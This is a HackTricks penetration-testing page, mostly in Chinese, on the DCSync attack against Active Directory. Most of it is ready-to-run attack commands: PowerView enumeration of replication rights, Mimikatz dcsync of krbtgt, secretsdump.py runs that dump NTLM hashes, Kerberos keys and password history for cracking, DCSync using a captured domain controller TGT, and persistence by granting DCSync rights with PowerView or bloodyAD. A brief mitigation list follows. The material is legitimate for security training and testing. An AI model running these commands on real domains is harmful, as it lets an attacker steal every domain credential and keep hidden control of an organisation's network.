# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 权限意味着在域本身上拥有这些权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。

**关于 DCSync 的重要说明：**

- **DCSync 攻击会模拟 Domain Controller 的行为，并请求其他 Domain Controller 使用 Directory Replication Service Remote Protocol (MS-DRSR) 复制信息**。由于 MS-DRSR 是 Active Directory 的合法且必要功能，因此无法关闭或禁用。
- 默认情况下，只有 **Domain Admins、Enterprise Admins、Administrators 和 Domain Controllers** 组拥有所需权限。
- 实际上，**完整的 DCSync** 需要域命名上下文上的 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`**。`DS-Replication-Get-Changes-In-Filtered-Set` 通常会与它们一起被委派，但它单独更适合用于同步 **confidential / RODC-filtered attributes**（例如 legacy LAPS-style secrets），而不是用于完整的 krbtgt dump。
- 如果任何账户密码使用了可逆加密存储，Mimikatz 中有一个选项可以返回明文密码

### Enumeration

使用 `powerview` 检查谁拥有这些权限：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
如果你想专注于拥有 DCSync 权限的**非默认主体**，请过滤掉内置的、具备复制能力的组，只检查意外的受托者：
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### 本地利用
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程 Exploit
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
实际范围示例：
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 使用捕获的 DC 机器 TGT（ccache）进行 DCSync

在 unconstrained-delegation 导出模式场景中，你可能会捕获到一个 Domain Controller 机器 TGT（例如，`DC1$@DOMAIN` 用于 `krbtgt@DOMAIN`）。然后你可以使用该 ccache 以 DC 身份进行认证，并在没有密码的情况下执行 DCSync。
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
操作说明：

- **Impacket 的 Kerberos 路径会先接触 SMB**，然后才进行 DRSUAPI 调用。如果环境强制执行 **SPN target name validation**，完整转储可能会失败，并提示 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- 在这种情况下，要么先为目标 DC 请求一个 **`cifs/<dc>`** service ticket，要么改用 **`-just-dc-user`** 来立即获取你需要的账户。
- 当你只有较低的 replication 权限时，LDAP/DirSync 风格的同步仍然可以暴露 **confidential** 或 **RODC-filtered** 属性（例如旧的 `ms-Mcs-AdmPwd`），而不需要完整的 krbtgt replication。

`-just-dc` 会生成 3 个文件：

- 一个包含 **NTLM hashes**
- 一个包含 **Kerberos keys**
- 一个包含 NTDS 中任何启用了 [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) 的账户的明文密码。你可以用下面的方式获取启用了 reversible encryption 的用户：

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

如果你是 domain admin，你可以借助 `powerview` 将这些权限授予任意用户：
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux 操作员可以使用 `bloodyAD` 做同样的事情：
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
然后，你可以**检查用户是否被正确分配**这 3 个权限，查看它们在以下输出中的位置（你应该能够在 "ObjectType" 字段中看到这些权限的名称）：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解措施

- Security Event ID 4662 (Audit Policy for object must be enabled) – 对一个对象执行了操作
- Security Event ID 5136 (Audit Policy for object must be enabled) – 一个目录服务对象被修改了
- Security Event ID 4670 (Audit Policy for object must be enabled) – 一个对象上的权限被更改了
- AD ACL Scanner - 创建并比较 ACL 的创建报告。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
